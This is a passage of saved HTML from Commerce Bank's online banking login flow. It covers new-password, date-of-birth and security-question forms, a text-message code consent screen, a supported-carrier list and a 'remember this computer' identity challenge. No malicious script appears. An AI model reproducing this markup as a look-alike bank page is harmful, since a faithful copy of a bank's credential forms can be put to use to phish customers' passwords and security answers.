   <INPUT tabindex="22" class="cb-form-control" class="cb-form-control" id="input-confirm-new-password" type="password" :class="{ 'inputHasError': showPwMatchError &amp;&amp; focus !== 'pwField'}" data-qaid="input-confirm-new-password" autocomplete="off" @blur="removeFocus" @focus="updatePwFocus" v-model="confirmNewPassword">
<DIV class="cb-form-control-feedback errorMessage" v-cloak="" data-qaid="pw-match-error" 
v-if="showPwMatchError &amp;&amp; focus !== 'pwField'"><I class="cb-icon icon-warning"></I>{{pwMatchErrorText}} 
                </DIV></DIV></DIV>
<DIV class="progress-dots"><SPAN class="dot-non-active"></SPAN>                 
<SPAN class="dot-non-active"></SPAN>                 <SPAN 
class="dot-active"></SPAN>             </DIV><BUTTON tabindex="23" class="cb-btn cb-btn-primary cb-btn-block cb-btn-lg" 
id="accountDetails-submit" type="submit" v-bind:disabled="!enableNewPWSubmitBtn || processingRequest" 
data-qaid="btn-submit-new-password" v-on:click.prevent="submitNewPW()"><IMG 
class="img-loading icon-spin spinner" id="newPwSubmitSpinner" alt="New Password Submitting Spinner" 
src="https://banking.commercebank.com/CBI/Content/Images/loader-white.svg" v-if="processingRequest"> 
                <SPAN v-if="!processingRequest">{{submitBtnText}}</SPAN>         
    </BUTTON>
<DIV class="password-reset-cancel-button-wrapper"><A tabindex="24" class="password-reset-cancel-button" 
href="https://banking.commercebank.com/CBI/Auth/Login#" data-qaid="btn-cancel-new-password" 
v-on:click="cancelButtonClicked()">                    Cancel                 
</A>             </DIV></FORM></DIV></DIV></DIV>
<DIV id="securityQuestionsFormContainer" v-if="form === 'securityQuestions'" 
key="8">
<DIV id="security-questions-form" data-qaid="security-questions-form">
<DIV id="securityQuestions">
<H4 class="password-reset-title">Next, please answer the following 
questions.</H4>
<FORM id="securiyQuestions">
<DIV class="cb-form-group"><LABEL class="cb-form-control-label" for="input-dateofbirth" 
data-qaid="login-label-dateofbirth">Date of Birth</LABEL>                 
<masked-input tabindex="12" class="cb-form-control" class="cb-form-control" id="input-dateofbirth" 
:class="{ 'inputHasError': showDobError &amp;&amp; focus !== 'dateOfBirthAnswer' }" 
type="text" data-qaid="login-input-dateofbirth" autocomplete="off" name="dob" 
@blur="removeFocus" @focus="updateDobFocus" v-focus="dobFocus" v-model="dateOfBirthAnswer" 
placeholder-char="&#8192;" :guide="false" :mask="dobMask"></masked-input>
<DIV class="cb-form-control-feedback errorMessage" v-cloak="" data-qaid="dobError" 
v-if="showDobError &amp;&amp; focus !== 'dateOfBirthAnswer'"><I class="cb-icon icon-warning"></I> 
{{dobInputError}}                 </DIV></DIV>
<DIV class="cb-form-group"><LABEL class="cb-form-control-label" for="input-question-1" 
data-qaid="login-label-question-1">{{question1}}</LABEL>                 
<INPUT tabindex="13" class="cb-form-control" id="input-question-1" type="text" data-qaid="login-input-question-1" v-model="answer1"></DIV>
<DIV class="cb-form-group"><LABEL class="cb-form-control-label" for="input-question-2" 
data-qaid="login-label-question-2">{{question2}}</LABEL>                 
<INPUT tabindex="14" class="cb-form-control" id="input-question-2" type="text" data-qaid="login-input-question-2" v-model="answer2"></DIV>
<DIV class="progress-dots"><SPAN class="dot-non-active"></SPAN>                 
<SPAN class="dot-active"></SPAN>                 <SPAN 
class="dot-non-active"></SPAN>             </DIV><BUTTON tabindex="15" class="cb-btn cb-btn-primary cb-btn-block cb-btn-lg" 
id="accountDetails-submit" type="submit" v-bind:disabled="!enableSecSubmitBtn || processingRequest" 
data-qaid="btn-submit-security-questions" v-on:click.prevent="submitSecQuestions()"><IMG 
class="img-loading icon-spin spinner" id="securityQuestionsContinueSpinner" alt="Security Questions Continue Button Spinner" 
src="https://banking.commercebank.com/CBI/Content/Images/loader-white.svg" v-if="processingRequest"> 
                <SPAN v-if="!processingRequest">{{continueBtnTxt}}</SPAN>        
     </BUTTON>
<DIV class="password-reset-cancel-button-wrapper"><A tabindex="16" class="password-reset-cancel-button" 
href="https://banking.commercebank.com/CBI/Auth/Login#" data-qaid="btn-cancel-security-questions" 
v-on:click="cancelButtonClicked()">                    Cancel                 
</A>             </DIV></FORM></DIV></DIV></DIV>
<DIV id="textAuthorizationFormContainer" v-if="form === 'textAuthorization'" 
key="9">
<DIV id="pwreset-text-auth-form" data-qaid="pwreset-text-auth-form">
<DIV class="password-reset-failure-title">Text Message Authorization</DIV>
<FORM id="textAuthorizationForm">
<DIV class="password-reset-slide-wrapper">
<DIV class="forgot-id-body"><SPAN>                    By clicking �Send one-time 
security code� you represent to Commerce                    Bank that you are 
authorized to send or receive text messages using                    the mobile 
phone selected, and grant Commerce Bank express                    permission to 
send a text message to the mobile phone number                    selected.  
<B>Message and data rates may apply</B>, check your mobile phone                 
   carrier plan for details.                      <A tabindex="1" class="cb-link paragraph-link" 
id="supported-carriers-link" href="https://banking.commercebank.com/CBI/Auth/Login#" 
data-qaid="pwr-supported-carriers-link" v-on:click="openCarriersModal()">        
                Click here</A> to see a list of supported carriers.              
      The wireless carriers are not liable for delayed or undelivered messages.  
                   <A tabindex="2" class="cb-link paragraph-link" id="privacy-statement-link" 
href="https://www.commercebank.com/security-center/privacy-statement" target="_blank" 
data-qaid="pwr-privacy-statement-link">Click here</A> to see our Privacy 
Statement.                 </SPAN>             </DIV></DIV>
<DIV class="progress-dots"><SPAN class="dot-non-active"></SPAN>             
<SPAN class="dot-active"></SPAN>             <SPAN 
class="dot-non-active"></SPAN>         </DIV><BUTTON tabindex="3" class="cb-btn cb-btn-primary cb-btn-block cb-btn-lg" 
id="text-auth-submit" type="submit" v-bind:disabled="processingRequest" 
data-qaid="btn-submit-otc-options" v-on:click.prevent="submitOtcOption()"><IMG 
class="img-loading icon-spin spinner" id="oneTimeCodeOptionContinueSpinner" alt="Text Authorization Submit Button Spinner" 
src="https://banking.commercebank.com/CBI/Content/Images/loader-white.svg" v-if="processingRequest"> 
            <SPAN v-if="!processingRequest">Send one-time security code</SPAN>   
      </BUTTON>
<DIV class="password-reset-cancel-button-wrapper"><A tabindex="4" class="password-reset-cancel-button" 
href="https://banking.commercebank.com/CBI/Auth/Login#" data-qaid="btn-cancel-otc-options" 
v-on:click="chooseNewDeliveryMethod()">                Cancel             </A>   
      </DIV></FORM></DIV></DIV></transition>     </DIV>
<DIV class="cb-modal cb-fade pw-reset-failure-modal" id="password-reset-error-modal" 
data-qaid="pwr-error-modal">
<DIV class="cb-modal-dialog pw-reset-failure-modal-dialog" role="document">
<DIV class="cb-modal-content pw-reset-failure-modal-content">
<DIV class="cb-modal-header">
<H2 class="cb-modal-title pw-reset-failure-modal-header" id="passwordResetModalLabel">{{failureTitleText}}</H2><I 
class="cb-close cb-icon icon-close" aria-hidden="true" aria-label="Close" 
data-qaid="modal-close" data-dismiss="cb-modal"></I>                 </DIV>
<DIV class="cb-modal-body pw-reset-failure-modal-body"><SPAN v-html="failureBodyText"></SPAN> 
                </DIV></DIV></DIV></DIV>
<DIV class="cb-modal cb-fade pw-reset-failure-modal" id="password-reset-supported-carriers-modal">
<DIV class="cb-modal-dialog pw-reset-failure-modal-dialog" role="document">
<DIV class="cb-modal-content pw-reset-failure-modal-content">
<DIV class="cb-modal-header">
<H2 class="cb-modal-title pw-reset-failure-modal-header" id="passwordResetModalLabel">List 
of Supported Carriers</H2><I class="cb-close cb-icon icon-close" aria-hidden="true" 
aria-label="Close" data-dismiss="cb-modal"></I>                 </DIV>
<DIV class="cb-modal-body forgot-id-body"><SPAN>                        Alaska 
Communications Systems (ACS), AllTel, AT&amp;T, Bluegrass Cellular,              
           Boost, CellCom, Cellular One of NE PA, Cellular South (C Spire),      
                   Chat Mobility-NW Missouri Cell, Cincinnati Bell, Cricket, 
Cross, ECIT,                         Element Mobile, Epic Touch, GCI Comm, 
Golden State Cellular,                         Illinois Valley Cellular, Immix, 
Inland Cellular, IWireless, Metro PCS,                         Mosaic Telecom, 
MTPCS Cellular One, Nex Tech Communications, nTelos,                         
Panhandle Wireless, Pioneer Cellular, Plateau Wireless, Revol Wireless,          
               Simmetry Wireless, Sprint, Syringa Wireless LLC, Thumb Cellular, 
T-Mobile�,                         Union Wireless, United Wireless, U.S. 
Cellular�, Verizon, Viaero Wireless,                         Virgin Mobile, West 
Central Wireless.                     </SPAN>                 
</DIV></DIV></DIV></DIV></template>                         
<password-reset></password-reset>                     </DIV>
<FORM style="display: none;"></FORM>
<FORM id="login-identity-form" data-bind="submit: doChallenge, visible: stage() === 'securityQuestion'">
<DIV class="cb-form-group">
<H3 id="login-challenge-title" data-qaid="login-challenge-title">Unable to 
Confirm your Identity</H3>
<P>We do not recognize the computer you are using. Please answer your security 
question so we can confirm your identity from this unrecognized computer. If you 
do not recognize the security question, try logging in again and retyping your 
Customer ID and Password.</P>
<DIV>
<DIV class="error-row" data-qaid="login-challenge-not-recognized" data-bind="visible: showSecurityQuestionError">
<DIV class="svg-container"><IMG class="warning-icon" alt="Warning" src="https://banking.commercebank.com/CBI/Content/Images/icons/warning-triangle.svg"> 
                                </DIV><SPAN class="error-text" data-qaid="login-error" 
data-bind="html: securityQuestionError"></SPAN>                             
</DIV></DIV>
<P style="margin-top: 20px;"><STRONG 
data-qaid="login-security-question-wrapper">                                Your 
security question: <SPAN data-qaid="login-label-securityquestion" data-bind="html: securityQuestion"></SPAN> 
                            </STRONG>                         </P></DIV>
<DIV class="cb-form-group"><LABEL class="cb-form-control-label" for="input-securityanswer" 
data-qaid="login-label-customerid">Answer</LABEL>                         
<INPUT class="cb-form-control" id="input-securityanswer" type="password" data-qaid="login-input-securityanswer" data-bind="textInput: securityAnswer" autocomplete="off"></DIV>
<DIV class="cb-form-group">                        Would you like to remember 
this computer?  <I title="What is this?" class="cb-icon icon-info" data-qaid="login-remember-icon" 
data-placement="top" data-toggle="cb-popover" data-content="To help us verify your identity, we'll ask a security question any time you log in from a computer that you haven't asked us to remember. If you ask us to remember a computer, we will - and you won't need to answer a security question any time you log in from that computer. For your security, you should not ask us to remember a public computer or one you don't plan to use often."></I> 
                    </DIV>
<DIV class="cb-form-group">
<DIV class="cb-stacked"><LABEL class="cb-form-radio-label"><INPUT name="rememberMe" 
class="cb-form-radio-input" type="radio" data-bind="checked: rememberMe, checkedValue: true"> 
                                <SPAN 
class="cb-form-radio-indicator"></SPAN><SPAN 
class="cb-form-radio-description">Yes, I plan on using this computer to access 
my account in the future.</SPAN>                             </LABEL>            
                 <LABEL class="cb-form-radio-label"><INPUT name="rememberMe" 
class="cb-form-radio-input" type="radio" data-bind="checked: rememberMe, checkedValue: false"> 
                                <SPAN 
class="cb-form-radio-indicator"></SPAN><SPAN 
class="cb-form-radio-description">No, this is a public computer or one I do not 
plan on using often to access my account.</SPAN>                             
</LABEL>                         </DIV></DIV>
<DIV class="cb-form-group login-submit-container" data-bind="css: { 'identity': stage() === 'securityQuestion' }"><BUTTON 
class="cb-btn cb-btn-secondary cb-btn-lg cb-btn-block" type="submit" data-qaid="login-button-challenge" 
data-bind="enable: !isLoadingChallenge() &amp;&amp; securityAnswer() !== ''"><IMG 
class="img-loading icon-spin" alt="loader-white" src="https://banking.commercebank.com/CBI/Content/Images/loader-white.svg" 
data-bind="visible: isLoadingChallenge()">                             <SPAN 
data-bind="text: !isLoadingChallenge() ? 'Continue' : ''"></SPAN>                
         </BUTTON>
<DIV class="login-submit-cancel-container"><A class="cb-link" href="https://banking.commercebank.com/CBI/Auth/Logout">Cancel</A> 
                        </DIV></DIV></FORM></DIV>
<DIV id="login-sidebar-wrapper">
<DIV id="login-ad-wrapper" data-qaid="login-ad"></DIV>
<DIV id="login-activate-container" data-bind="visible: stage() === 'securityQuestion'">
<H3 id="login-havingtrouble">Having Trouble?</H3>
<P><STRONG>Forgot the answer to your security question?</STRONG><BR>If you are 
unable to answer the first question in three attempts, you will be presented 
with a second question to answer.<BR> Once you have successfully logged in to 
Online Banking, you may change the answer to any of your security questions by 
going to the "My Profile" page in the Customer Service section.                  
   </P>
<P><STRONG>Your answer is not being accepted?</STRONG><BR>                       
 Please check your spelling and capitalization and re-enter your answer.         
            </P>
<P><STRONG>Need to reset a question or answer?</STRONG><BR>                      
  If you can log in to Online Banking, go to the "My Profile" page in the 
Customer Service section to reset your questions.                     
</P></DIV></DIV></DIV></DIV></DIV>
<DIV class="cb-modal cb-fade " id="forgot-CustomerId-modal" style="display: none;" 
data-qaid="">
<DIV class="cb-modal-dialog" role="document">
<DIV class="cb-modal-content">
<DIV class="cb-modal-header">
<H2 class="cb-modal-title">
<DIV class="forgot-id-wrapper">
<DIV class="forgot-id-header">Forgot Your Customer ID?</DIV></DIV></H2><I class="cb-close cb-icon icon-close" 
aria-hidden="true" aria-label="Close" data-qaid="modal-close" data-dismiss="cb-modal"></I> 
            </DIV>
<DIV class="cb-modal-body">
<DIV class="forgot-id-body">        To reset your customer ID please call 
Customer Support at <A class="customer-support-number" href="tel:800-986-2265" 
data-qaid="cust-service-num">800-986-2265</A>.     
</DIV></DIV></DIV></DIV></DIV>
<DIV id="new-footer">
<DIV class="content-wrap">
<DIV id="link-wrap">
<DIV id="link-slide"><A class="footer-link" href="http://www.commercebank.com/about/contact/contact.asp" 
target="_blank">                            Contact Us                         
</A>                         <A class="footer-link" href="http://www.commercebank.com/" 
target="_blank">                            Commerce Bank                        
 </A>                         <A class="footer-link" href="https://banking.commercebank.com/CBI/Help.aspx?questionID=Auth.Login" 
target="_blank">                            Help                         </A>    
                     <A class="footer-link" href="http://www.commercebank.com/privacy.asp" 
target="_blank">                            Privacy                         </A> 
            </DIV></DIV>
<DIV id="footertext-wrap">
<DIV id="footertext-content"><IMG id="equal-opportunity" alt="Equal Opportunity" 
src="https://banking.commercebank.com/CBI/Themes/TopTabMenu/Images/equalicon.svg"> 
                <SPAN id="legal-text">                    Copyright � 2020 
Commerce Bancshares, Inc. <BR>  All rights reserved. Commerce Bank: Member FDIC. 
                 </SPAN>             </DIV></DIV></DIV></DIV>
<DIV id="login-antiforgery"><INPUT name="__RequestVerificationToken" type="hidden" value="rPbxjJSSywVc6_bVAETfI_iqrtgXLGH8LHJjB3EVkwEduKc5UxlLYh27LXdBKSm5Mu-TTPujfOPMb46dlrterwMweei0_enEd2Ygr_m7CFA-_K8P9zwyDYS7Hz--2CXAr-x_DT0rtLADmGKrp1aiGw2"> 
            </DIV></DIV>
<SCRIPT src="https://banking.commercebank.com/_Incapsula_Resource?SWJIYLWA=8d6f1aa33a665c8f2b39aa47230ae91d,719d34d31c8e3a6e6fffd425f7e032f3&amp;ns=36&amp;cb=2100982943" type="text/javascript" async=""></SCRIPT>
 </BODY></HTML>
